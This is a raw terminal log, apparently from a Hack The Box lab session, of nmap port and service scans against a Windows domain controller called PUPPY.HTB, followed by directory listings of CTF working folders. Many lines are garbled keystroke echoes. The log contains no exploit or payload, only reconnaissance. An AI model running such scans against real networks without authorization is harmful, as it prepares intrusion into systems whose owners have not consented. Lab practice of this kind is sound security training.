@@ -1,0 +1,848 @@
+[2026-01-28 17:32:34] [w=0:tmux] [p=%0] [OUT] ap -p$ports -sSCV --min-rate=2000 -Pn -oN certifiedNmapServicesVersions.txt 10.129.231.186 nma1.nmaap.1nmapp 1p ---pp-
+[2026-01-28 17:32:50] [w=0:tmux] [p=%0] [OUT] --min-rate=3000 -vvv 10.129.231.186 -oN certifiedNmapOpenPorts.txt--min-rate=3000 -vvv-oN         pNmapOpenPorts.txtuNmapOpenPorts.txtpNmapOpenPorts.txtpNmapOpenPorts.txtyNmapOpenPorts.txt.puppyNmapOpenPorts.txt    10.129.231.186
+[2026-01-28 17:32:50] [w=0:tmux] [p=%0] [OUT] N  puppyNmapOpenPorts.txt   10.129.231.186
+[2026-01-28 17:33:03] [w=0:tmux] [p=%0] [OUT] N  puppyNmapOpenPorts.txtn puppyNmapOpenPorts.txtm puppyNmapOpenPorts.txta puppyNmapOpenPorts.txtp puppyNmapOpenPorts.txtnmapp/ puppyNmapOpenPorts.txt nmap/
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT]  -oN   -oN n  -oN nm  -oN nma  -oN nmap  -oN nmap/ /p 2 -oN nmap/puppyNmapOpenPorts.txt3 -oN nmap/puppyNmapOpenPorts.txt2 -oN nmap/puppyNmapOpenPorts.txt. -oN nmap/puppyNmapOpenPorts.txt7 -oN nmap/puppyNmapOpenPorts.txt5 -oN nmap/puppyNmapOpenPorts.txt
+[2026-01-28 17:33:49] [pane=%0] [CMD_START] nmap -p- --min-rate=3000 -vvv 10.129.232.75 -oN nmap/puppyNmapOpenPorts.txt
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 17:33 -0500
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Initiating Ping Scan at 17:33
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Scanning 10.129.232.75 [4 ports]
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Completed Ping Scan at 17:33, 0.05s elapsed (1 total hosts)
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Initiating Parallel DNS resolution of 1 host. at 17:33
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Completed Parallel DNS resolution of 1 host. at 17:33, 0.50s elapsed
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Initiating SYN Stealth Scan at 17:33
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Scanning 10.129.232.75 [65535 ports]
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Discovered open port 111/tcp on 10.129.232.75
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Discovered open port 53/tcp on 10.129.232.75
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Discovered open port 445/tcp on 10.129.232.75
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Discovered open port 139/tcp on 10.129.232.75
+[2026-01-28 17:33:49] [w=0:tmux] [p=%0] [OUT] Discovered open port 135/tcp on 10.129.232.75
+[2026-01-28 17:34:05] [w=0:tmux] [p=%0] [OUT] Discovered open port 49664/tcp on 10.129.232.75
+[2026-01-28 17:34:05] [w=0:tmux] [p=%0] [OUT] Discovered open port 9389/tcp on 10.129.232.75
+[2026-01-28 17:34:06] [w=0:tmux] [p=%0] [OUT] Discovered open port 3269/tcp on 10.129.232.75
+[2026-01-28 17:34:09] [w=0:tmux] [p=%0] [OUT] Discovered open port 464/tcp on 10.129.232.75
+[2026-01-28 17:34:10] [w=0:tmux] [p=%0] [OUT] Discovered open port 49694/tcp on 10.129.232.75
+[2026-01-28 17:34:11] [w=0:tmux] [p=%0] [OUT] Discovered open port 61839/tcp on 10.129.232.75
+[2026-01-28 17:34:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 49676/tcp on 10.129.232.75
+[2026-01-28 17:34:15] [w=0:tmux] [p=%0] [OUT] Discovered open port 3268/tcp on 10.129.232.75
+[2026-01-28 17:34:16] [w=0:tmux] [p=%0] [OUT] Discovered open port 3260/tcp on 10.129.232.75
+[2026-01-28 17:34:17] [w=0:tmux] [p=%0] [OUT] Discovered open port 389/tcp on 10.129.232.75
+[2026-01-28 17:34:20] [w=0:tmux] [p=%0] [OUT] Discovered open port 5985/tcp on 10.129.232.75
+[2026-01-28 17:34:20] [w=0:tmux] [p=%0] [OUT] Discovered open port 593/tcp on 10.129.232.75
+[2026-01-28 17:34:21] [w=0:tmux] [p=%0] [OUT] Discovered open port 636/tcp on 10.129.232.75
+[2026-01-28 17:34:26] [w=0:tmux] [p=%0] [OUT] Discovered open port 49669/tcp on 10.129.232.75
+[2026-01-28 17:34:27] [w=0:tmux] [p=%0] [OUT] Discovered open port 2049/tcp on 10.129.232.75
+[2026-01-28 17:34:28] [w=0:tmux] [p=%0] [OUT] Discovered open port 88/tcp on 10.129.232.75
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Completed SYN Stealth Scan at 17:34, 43.81s elapsed (65535 total ports)
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Nmap scan report for 10.129.232.75
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Host is up, received echo-reply ttl 127 (0.031s latency).
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Scanned at 2026-01-28 17:33:49 EST for 44s
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Not shown: 65514 filtered tcp ports (no-response)
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] PORT      STATE SERVICE          REASON
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 53/tcp    open  domain           syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 88/tcp    open  kerberos-sec     syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 111/tcp   open  rpcbind          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 135/tcp   open  msrpc            syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 139/tcp   open  netbios-ssn      syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 389/tcp   open  ldap             syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 445/tcp   open  microsoft-ds     syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 464/tcp   open  kpasswd5         syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 636/tcp   open  ldapssl          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 2049/tcp  open  nfs              syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 3260/tcp  open  iscsi            syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 5985/tcp  open  wsman            syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 9389/tcp  open  adws             syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 49664/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 49669/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 49676/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 49694/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] 61839/tcp open  unknown          syn-ack ttl 127
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Read data files from: /usr/share/nmap
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Nmap done: 1 IP address (1 host up) scanned in 44.45 seconds
+[2026-01-28 17:34:33] [w=0:tmux] [p=%0] [OUT] Raw packets sent: 131078 (5.767MB) | Rcvd: 43 (1.876KB)
+[2026-01-28 17:40:22] [w=0:tmux] [p=%0] [OUT] e
+[2026-01-28 17:40:31] [w=0:tmux] [p=%0] [OUT] Nm Nma Nmap NmapO NmapOp NmapOpe NmapOpen PNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)uNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)pNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)pNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)yNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)nPuppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)mPuppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)aPuppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)pPu
+[2026-01-28 17:40:33] [w=0:tmux] [p=%0] [OUT] pyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)/PuppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
+[2026-01-28 17:40:42] [w=0:tmux] [p=%0] [OUT] rts=  nmap/ PuppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)rts=  nmap/ PuppyNmapOpenPorts.txt |    |  Pup nmap/
+[2026-01-28 17:40:54] [pane=%0] [CMD_START] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/puppyNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
+[2026-01-28 17:40:59] [pane=%0] [CMD_START] echo ports$
+[2026-01-28 17:40:59] [w=0:tmux] [p=%0] [OUT] ports$
+[2026-01-28 17:41:07] [pane=%0] [CMD_START] echo $ports
+[2026-01-28 17:41:07] [w=0:tmux] [p=%0] [OUT] 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49669,49676,49694,61839
+[2026-01-28 17:41:19] [pane=%0] [CMD_START] echo .IP
+[2026-01-28 17:41:19] [w=0:tmux] [p=%0] [OUT] .IP
+[2026-01-28 17:41:24] [pane=%0] [CMD_START] echo $IP
+[2026-01-28 17:41:35] [pane=%0] [CMD_START] echo $.IP
+[2026-01-28 17:41:35] [w=0:tmux] [p=%0] [OUT] $.IP
+[2026-01-28 17:42:02] [w=0:tmux] [p=%0] [OUT] t
+[2026-01-28 17:42:04] [w=0:tmux] [p=%0] [OUT] Nm Nma Nmap pNmapServicesVersions.txt 10.129.231.186 uNmapServicesVersions.txt 10.129.231.186 pNmapServicesVersions.txt 10.129.231.186
+[2026-01-28 17:42:04] [w=0:tmux] [p=%0] [OUT] pNmapServicesVersions.txt 10.129.231.186
+[2026-01-28 17:42:29] [w=0:tmux] [p=%0] [OUT] npuppyNmapServicesVersions.txt 10.129.232.75 mpuppyNmapServicesVersions.txt 10.129.232.75 apuppyNmapServicesVersions.txt 10.129.232.75
+[2026-01-28 17:42:31] [w=0:tmux] [p=%0] [OUT] ppuppyNmapServicesVersions.txt 10.129.232.75
+[2026-01-28 17:43:47] [w=0:tmux] [p=%0] [OUT] o
+[2026-01-28 17:43:50] [w=0:tmux] [p=%0] [OUT] nm nma nmap
+[2026-01-28 17:43:50] [pane=%0] [CMD_START] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/puppyNmapServicesVersions.txt 10.129.232.75 
+[2026-01-28 17:43:50] [w=0:tmux] [p=%0] [OUT] Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 17:43 -0500
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Nmap scan report for 10.129.232.75
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Host is up (0.032s latency).
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Bug in iscsi-info: no string output.
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] PORT      STATE SERVICE       VERSION
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 53/tcp    open  domain        Simple DNS Plus
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-28 22:43:56Z)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 111/tcp   open  rpcbind       2-4 (RPC #100000)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] | rpcinfo:
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   program version    port/proto  service
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/tcp   rpcbind
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/tcp6  rpcbind
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/udp   rpcbind
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100000  2,3,4        111/udp6  rpcbind
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100003  2,3         2049/udp   nfs
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100003  2,3         2049/udp6  nfs
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100005  1,2,3       2049/udp   mountd
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100005  1,2,3       2049/udp6  mountd
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/tcp   nlockmgr
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/tcp6  nlockmgr
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/udp   nlockmgr
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100021  1,2,3,4     2049/udp6  nlockmgr
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/tcp   status
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/tcp6  status
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   100024  1           2049/udp   status
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_  100024  1           2049/udp6  status
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 135/tcp   open  msrpc         Microsoft Windows RPC
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 445/tcp   open  microsoft-ds?
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 464/tcp   open  kpasswd5?
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 636/tcp   open  tcpwrapped
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 3260/tcp  open  iscsi?
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 3269/tcp  open  tcpwrapped
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_http-title: Not Found
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_http-server-header: Microsoft-HTTPAPI/2.0
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 9389/tcp  open  mc-nmf        .NET Message Framing
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 49664/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 49669/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 49694/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] 61839/tcp open  msrpc         Microsoft Windows RPC
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Host script results:
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_clock-skew: -2s
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] | smb2-time:
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   date: 2026-01-28T22:45:50
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_  start_date: N/A
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] | smb2-security-mode:
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |   3.1.1:
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] |_    Message signing enabled and required
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[2026-01-28 17:46:43] [w=0:tmux] [p=%0] [OUT] Nmap done: 1 IP address (1 host up) scanned in 173.16 seconds
+[2026-01-28 17:56:43] [pane=%0] [CMD_START] ll
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] total 2460
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:54  Active
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Jan  7 13:10  administrator
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-r--r-- 1 b7h30 b7h30   6857 Jan  7 06:39  AGENTS.md
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:54  Appointment
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Dec 17 17:52  blackfield
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Jan 27 20:30  certified
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:54  Cicada
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:54  Clicker
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Dec 20 22:55  Escape
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Jan 15 20:20  EscapeTwo
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 16:40  ffuf
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:55  Flight
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 18 16:46  Folder
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:55  Forest
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rwxrwxr-x 1 b7h30 b7h30    798 Dec 12 16:54  init_machine.sh
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 16:40  logs
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 16:40  loot
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:55  Monteverde
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 7 b7h30 b7h30   4096 Jan 16 10:03 'new box folders'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Jan 28 17:43  nmap
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 241398 May  3  2025 'Pasted image 20250503125640.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 241398 May  3  2025 'Pasted image 20250503125655.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 208915 May  3  2025 'Pasted image 20250503131159.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 219909 May  3  2025 'Pasted image 20250503131347.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 128395 May 17  2025 'Pasted image 20250517114233.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 167122 May 17  2025 'Pasted image 20250517114658.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 200271 May 17  2025 'Pasted image 20250517120035.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 200271 May 17  2025 'Pasted image 20250517120156.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 313309 Jul 20  2025 'Pasted image 20250720125636.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 115109 Jul 20  2025 'Pasted image 20250720125844.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30 212877 Aug  1 17:49 'Pasted image 20250801174912.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-r--r-- 1 b7h30 b7h30  45900 Nov 22 13:32 'Pasted image 20251122133248.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-r--r-- 1 b7h30 b7h30  72944 Dec 11 18:00 'Pasted image 20251211180026.png'
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 3 b7h30 b7h30   4096 Jan 28 17:30  puppy
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 8 b7h30 b7h30   4096 Jan 28 17:30  Puppy
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30   1796 Dec 27 20:03  README.md
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:55  Return
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Jan  6 05:23  Sauna
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 13:56  Support
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30    664 Dec 12 17:08  template.md
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 3 b7h30 b7h30   4096 Jan 14 20:59  TestLog
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 9 b7h30 b7h30   4096 Jan 23 23:57  theFrizz
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30   4096 Dec 12 16:10  Timelapse
+[2026-01-28 17:56:43] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30     91 Dec 21 00:11 'TMUX whitespace remover.md'
+[2026-01-28 17:56:50] [w=0:tmux] [p=%0] [OUT] cd ../logscd cd P      PPuuppppyyuPuppyu Puppy
+[2026-01-28 17:56:50] [pane=%0] [CMD_START] cd Puppy
+[2026-01-28 17:56:51] [pane=%0] [CMD_START] ll
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] total 32
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30  186 Jan 28 17:30  attack-chain.md
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:30  bloodhound
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:30  evidence
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:30  ffuf
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:33  logs
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:30  loot
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 17:30  nmap
+[2026-01-28 17:56:51] [w=0:tmux] [p=%0] [OUT] -rw-rw-r-- 1 b7h30 b7h30  125 Jan 28 17:30 'Puppy writeup.md'
+[2026-01-28 17:56:54] [pane=%0] [CMD_START] cd nmap
+[2026-01-28 17:57:50] [w=0:tmux] [p=%0] [OUT] ....//....//ppuuppppu../../puppuy  ../../pupppyls ../../puppyuls ../../puppyy//n../../puppy/nam  map
+[2026-01-28 17:57:50] [pane=%0] [CMD_START] ls ../../puppy/nmap
+[2026-01-28 17:57:50] [w=0:tmux] [p=%0] [OUT] ls: cannot access '../../puppy/nmap': No such file or directory
+[2026-01-28 17:57:53] [pane=%0] [CMD_START] ls ../../puppy/
+[2026-01-28 17:57:53] [w=0:tmux] [p=%0] [OUT] logs
+[2026-01-28 17:58:52] [w=0:tmux] [p=%0] [OUT] -Pn -oNecho $.IP
+[2026-01-28 17:58:55] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 17:58:55] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 17:58:55] [w=0:tmux] [p=%0] [OUT] -Pn -oNnmap -p$ports -sSCV --min-rate=2000
+[2026-01-28 17:58:55] [w=0:tmux] [p=%0] [OUT] -Pn -oNecho $.IP
+[2026-01-28 17:59:03] [w=0:tmux] [p=%0] [OUT] Completing `log filename' or `host'
+[2026-01-28 18:02:15] [w=0:tmux] [p=%0] [OUT] nmap -p- --min-rate=3000 -vvv 10.129.232.75 -oN /nmap/puppyNmapOpenPorts.txtnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oN puppyNmapOpenPorts.txt~/nmap/ puppyNmapOpenPorts.txt  nmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oN      ~/Documents/obsidian/docs/CTF/HTB/Puppy/nmappuppyNmapOpenPorts.txt/puppyNmapOpenPorts.txtnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oN puppyNmapOpenPorts.txt~/Documents/obsidian/docs/CTF/HTB/Puppy/nmap/ ~/Documents/obsidian/docs/CTF/HTB/Puppy/nmap/nmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 -vvv-oNnmap -p- --min-rate=3000 